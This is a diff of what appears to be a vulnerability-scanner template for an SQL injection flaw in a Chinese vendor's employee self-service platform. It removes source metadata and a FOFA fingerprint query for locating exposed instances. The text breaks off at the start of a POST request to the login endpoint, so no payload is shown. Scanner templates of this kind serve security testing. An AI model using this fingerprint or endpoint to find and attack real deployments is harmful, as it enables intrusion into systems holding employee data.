@@ -3,14 +3,8 @@ info:
   name: 广州翰智软件有限公司员工自助平台存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gaks7gxmewl9ksl8
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gaks7gxmewl9ksl8
-    fofa: (body:"./static/hrfonts/iconfont.css" and body:"./static/styles/iview.css")
 http:
 - raw:
   - 'POST /hrssc/portal/plantform/loginByPassword HTTP/1.1
